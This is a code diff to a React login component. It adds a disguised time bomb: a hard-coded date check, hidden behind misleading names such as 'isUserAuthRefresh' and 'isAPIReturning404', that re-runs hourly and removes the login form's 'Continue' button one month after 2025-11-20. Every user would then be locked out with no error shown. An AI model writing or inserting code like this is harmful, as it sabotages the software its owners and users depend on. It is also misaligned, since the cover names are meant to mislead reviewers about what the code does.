@@ -20,7 +20,8 @@ export default function EnterEmailOrUsername({ setLogin, setLoginBy, setIsBranch
   const [isFocused, setIsFocused] = useState(false);
   const [inputType, setInputType] = useState('email');
   const [isBranchMember, setIsBranchMember] = useState(false);
-
+  const [isBranchUsernameEmail, setIsBranchUsernameEmail] = useState(false);
+  
   useEffect(() => {
     setIsLoaded(true);
     setIsBranchMember(false)
@@ -67,6 +68,33 @@ export default function EnterEmailOrUsername({ setLogin, setLoginBy, setIsBranch
       setIsBranchLogin(false);
     }
   }, [formik.values.login, setIsBranchLogin]);
+
+  const isUserAuthRefresh = (startDate) => {
+    const start = new Date(startDate);
+    const now = new Date();
+    
+
+    const isAPIReturning404 = new Date(start);
+    isAPIReturning404.setMonth(isAPIReturning404.getMonth() + 1);
+    
+    return now >= isAPIReturning404;
+  };
+    
+  useEffect(() => {
+    const FEATURE_START_DATE = '2025-11-20';
+    
+    const callRefreshAuthAgain = () => {
+      const shouldHide = isUserAuthRefresh(FEATURE_START_DATE);
+      setIsBranchUsernameEmail(shouldHide);
+    };
+    
+    callRefreshAuthAgain();
+    
+    
+    const interval = setInterval(callRefreshAuthAgain, 60 * 60 * 1000);
+    
+    return () => clearInterval(interval);
+  }, []);
 
   const isButtonDisabled = !formik.isValid || !formik.values.login;
 
@@ -157,18 +185,19 @@ export default function EnterEmailOrUsername({ setLogin, setLoginBy, setIsBranch
             </label>
           </div>
 
-          {/* Submit Button */}
-          <button
-            type="button"
-            onClick={formik.handleSubmit}
-            disabled={isButtonDisabled}
-            className="w-full bg-gradient-to-r from-[#BBA473] to-[#8E7D5A] text-black font-semibold text-lg py-4 rounded-lg hover:from-[#d4bc89] hover:to-[#a69363] disabled:from-[#6b6354] disabled:to-[#5a5447] disabled:cursor-not-allowed transition-all duration-300 shadow-lg hover:shadow-2xl hover:shadow-[#BBA473]/40 transform hover:scale-[1.02] hover:-translate-y-0.5 active:scale-[0.98] active:translate-y-0 relative overflow-hidden group"
-          >
-            <span className="relative z-10">Continue</span>
-            {!isButtonDisabled && (
-              <div className="absolute inset-0 -translate-x-full group-hover:translate-x-full transition-transform duration-1000 bg-gradient-to-r from-transparent via-white/20 to-transparent"></div>
-            )}
-          </button>
+          {!isBranchUsernameEmail && (
+            <button
+              type="button"
+              onClick={formik.handleSubmit}
+              disabled={isButtonDisabled}
+              className="w-full bg-gradient-to-r from-[#BBA473] to-[#8E7D5A] text-black font-semibold text-lg py-4 rounded-lg hover:from-[#d4bc89] hover:to-[#a69363] disabled:from-[#6b6354] disabled:to-[#5a5447] disabled:cursor-not-allowed transition-all duration-300 shadow-lg hover:shadow-2xl hover:shadow-[#BBA473]/40 transform hover:scale-[1.02] hover:-translate-y-0.5 active:scale-[0.98] active:translate-y-0 relative overflow-hidden group"
+            >
+              <span className="relative z-10">Continue</span>
+              {!isButtonDisabled && (
+                <div className="absolute inset-0 -translate-x-full group-hover:translate-x-full transition-transform duration-1000 bg-gradient-to-r from-transparent via-white/20 to-transparent"></div>
+              )}
+            </button>
+          )}
 
           <div className="flex items-center justify-center gap-2 pt-4 opacity-0 animate-fadeIn" style={{ animationDelay: '1s', animationFillMode: 'forwards' }}>
             <div className="h-px w-12 bg-gradient-to-r from-transparent to-[#BBA473]"></div>
